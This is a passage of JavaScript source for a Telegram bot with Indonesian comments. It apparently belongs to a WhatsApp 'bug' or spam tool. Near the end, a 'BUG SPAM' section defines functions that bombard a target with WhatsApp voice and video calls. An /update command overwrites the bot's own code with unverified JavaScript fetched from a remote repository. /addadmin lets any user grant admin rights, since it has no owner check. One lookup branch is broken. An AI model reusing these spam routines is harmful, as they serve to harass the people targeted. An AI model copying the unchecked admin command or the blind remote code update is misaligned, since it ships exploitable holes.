      `✅ Grup ${targetGroupId} is already a Vip group. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`
    );
  }
});
//=====================================
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin 6843967527.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});

bot.onText(/\/cekid(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const chatType = msg.chat.type;
    const userId = msg.from.id;

    let targetId;
    let targetUsername;

    if (msg.reply_to_message) {
        targetId = msg.reply_to_message.from.id;
        targetUsername = msg.reply_to_message.from.username || 'Tidak ada username';
    } else if (match[1]) {
        const username = match[1].replace('@', '');

    } else {
        targetId = msg.from.id;
        targetUsername = msg.from.username || 'Tidak ada username';
    }

    bot.sendMessage(chatId, `🆔 *ID Pengguna:*\nID: \`${targetId}\`\nUsername: @${targetUsername}`, { parse_mode: 'Markdown' });
});

bot.onText(/\/update/, async (msg) => {
    const chatId = msg.chat.id;

    const repoRaw = "https://raw.githubusercontent.com/sanz-max/seraphineupdate/main/Asmo.js";

    bot.sendMessage(chatId, "⏳ Sedang mengecek update...");

    try {
        const { data } = await axios.get(repoRaw);

        if (!data) return bot.sendMessage(chatId, "❌ Update gagal: File kosong!");

        fs.writeFileSync("./Asmo.js", data);

        bot.sendMessage(chatId, "✅ Update berhasil!\nSilakan restart bot.");

        process.exit(); // restart jika pakai PM2
    } catch (e) {
        console.log(e);
        bot.sendMessage(chatId, "❌ Update gagal. Pastikan repo dan file index.js tersedia.");
    }
});

bot.onText(/\/tourl/i, async (msg) => {
    const chatId = msg.chat.id;
    const FormData = require('form-data');
    
    if (!msg.reply_to_message || (!msg.reply_to_message.document && !msg.reply_to_message.photo && !msg.reply_to_message.video)) {
        return bot.sendMessage(chatId, "❌ Silakan reply sebuah file/foto/video dengan command /tourl");
    }

    const repliedMsg = msg.reply_to_message;
    let fileId, fileName;

    
    if (repliedMsg.document) {
        fileId = repliedMsg.document.file_id;
        fileName = repliedMsg.document.file_name || `file_${Date.now()}`;
    } else if (repliedMsg.photo) {
        fileId = repliedMsg.photo[repliedMsg.photo.length - 1].file_id;
        fileName = `photo_${Date.now()}.jpg`;
    } else if (repliedMsg.video) {
        fileId = repliedMsg.video.file_id;
        fileName = `video_${Date.now()}.mp4`;
    }

    try {
        
        const processingMsg = await bot.sendMessage(chatId, "⏳ Mengupload ke Catbox...");

        
        const fileLink = await bot.getFileLink(fileId);
        const response = await axios.get(fileLink, { responseType: 'stream' });

        
        const form = new FormData();
        form.append('reqtype', 'fileupload');
        form.append('fileToUpload', response.data, {
            filename: fileName,
            contentType: response.headers['content-type']
        });

        const { data: catboxUrl } = await axios.post('https://catbox.moe/user/api.php', form, {
            headers: form.getHeaders()
        });

        
        await bot.editMessageText(`✅ Upload berhasil!\n📎 URL: ${catboxUrl}`, {
            chat_id: chatId,
            message_id: processingMsg.message_id
        });

    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, "❌ Gagal mengupload file ke Catbox");
    }
});

bot.onText(/\/setjeda (\d+[smh])/, (msg, match) => { 
const chatId = msg.chat.id; 
const response = setCooldown(match[1]);

bot.sendMessage(chatId, response); });
//=========FUNCTION BUG SPAM==========\\

// ============================================
//  BUG MENU (node-telegram-bot-api)
// ============================================


// ==== STATE ====


// FUNCTION SPAM CALL
async function spamcall(target) {
console.log(chalk.blue(`CRAYX - SPAM CALL ${target}`));
    try {
        await sock.offerCall(target);
    }
     catch (error) {
   }
}

async function spamcall2(target) {
    try {
      await Sock.offerCall(target, {video: true });
     } 
     catch (error) {
    }
  }    